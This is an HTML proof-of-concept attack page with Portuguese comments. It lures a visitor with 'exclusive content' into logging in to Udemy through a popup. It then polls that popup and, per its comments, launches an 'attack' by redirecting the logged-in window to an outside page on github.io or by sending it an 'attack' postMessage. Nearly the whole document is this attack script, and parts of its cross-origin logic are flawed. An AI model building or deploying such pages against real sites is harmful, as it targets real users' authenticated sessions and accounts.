<!DOCTYPE html>
<html>
<head>
    <title>Conteúdo Exclusivo</title>
</head>
<body>
    <h1>Para acessar o conteúdo exclusivo, faça login:</h1>
    <button id="login-button">Login com Site</button>
    
    <script>
        let popup = null;
        let checkPopupInterval;
        
        document.getElementById('login-button').addEventListener('click', function() {
            // Abre um popup para o site alvo
            popup = window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', 'LoginWindow', 'width=600,height=700');
            
            // Verifica periodicamente se o usuário completou o login
            checkPopupInterval = setInterval(checkIfLoggedIn, 1000);
        });
        
        function checkIfLoggedIn() {
            try {
                // Se conseguirmos acessar o popup e ele estiver na página de perfil
                // Isso pode falhar por CORS, mas é uma tentativa
                if (popup && popup.location.href.includes('perfil')) {
                    clearInterval(checkPopupInterval);
                    
                    // Usuário está logado, agora podemos tentar o ataque
                    attackAfterLogin();
                }
            } catch(e) {
                // Erro CORS ao tentar acessar o popup - é esperado
                console.log("Verificando login...");
            }
            
            // Se o popup foi fechado, cancelamos a verificação
            if (popup && popup.closed) {
                clearInterval(checkPopupInterval);
                console.log("Usuário fechou a janela de login");
            }
        }
        
        function attackAfterLogin() {
            // O usuário está logado no popup, agora fazemos o ataque
            // Criamos um form no popup ou redirecionamos para nossa página de ataque
            try {
                popup.location.href = 'https://alanls1.github.io/test/';
            } catch(e) {
                // Se falhar por CORS, tentamos injetar via postMessage
                popup.postMessage({action: 'attack'}, 'https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode');
            }
        }
    </script>
</body>
</html>
